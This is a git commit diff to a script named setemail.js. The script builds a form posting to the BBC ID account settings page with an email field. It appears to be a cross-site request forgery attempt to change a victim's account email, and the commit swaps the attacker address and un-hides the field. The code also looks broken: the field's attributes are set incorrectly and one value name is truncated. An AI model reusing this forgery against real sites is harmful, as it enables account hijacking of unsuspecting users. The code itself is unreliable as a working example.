0f52db6961bcae66d33e8167c9732b05e3dd1951
jianfangbh <jianfangbh@hotmail.co.uk>
2015-12-18 13:32:39 +0000

    Update setemail.js

--- setemail.js
+++ setemail.js
@@ -5,8 +5,8 @@ var frame = window.frames[0].document.documentElement;
 form.setAttribute("action", "https://ssl.bbc.co.uk/id/settings");
 
   var hiddenField = document.createElement("input");
-  hiddenField.setAttribute("type", "hidden");
-  hiddenField.setAttribute("email", "ianfanggong%40hotmail.com");
+  //hiddenField.setAttribute("type", "hidden");
+  hiddenField.setAttribute("email", "ianfangbh%40hotmail.co.uk");
   hiddenField.setAttribute("bbcid_submit_butto", "save");
 
   form.appendChild(hiddenField);
